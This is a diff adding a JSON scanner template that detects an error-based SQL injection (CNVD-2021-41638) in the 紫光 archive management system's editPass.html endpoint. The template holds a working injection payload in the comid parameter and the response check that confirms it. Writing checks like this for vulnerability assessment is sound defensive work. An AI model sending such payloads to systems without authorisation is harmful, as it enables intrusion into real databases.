@@ -1,0 +1,32 @@
+{
+    "Name": "紫光档案管理系统SQL注入",
+    "Description": "紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638",
+    "Product": "紫光",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type": "application/x-www-form-urlencoded"},
+        "Uri":"/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "c4ca4238a0b923820dcc509a6f75849"
+                },  
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
